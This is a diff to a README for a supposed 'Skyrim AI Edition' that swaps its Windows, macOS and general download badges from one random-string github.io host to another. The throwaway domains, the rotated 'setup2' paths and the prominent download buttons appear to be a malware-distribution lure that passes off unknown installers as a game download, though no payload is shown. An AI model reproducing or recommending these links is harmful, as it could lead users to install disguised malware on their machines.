@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Skyrim AI Edition](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_SKYRIM_AI_EDITION-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download Skyrim AI Edition](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_SKYRIM_AI_EDITION-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://vkbcfwqqceuz.github.io/windows-setup2/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Skyrim AI Edition** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-4E6B8A?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-4E6B8A?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-4E6B8A?style=for-the-badge&logo=windows&logoColor=white)](https://vkbcfwqqceuz.github.io/windows-setup2/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-4E6B8A?style=for-the-badge&logo=apple&logoColor=white)](https://vkbcfwqqceuz.github.io/macos-get2/)
 
 </div>
 
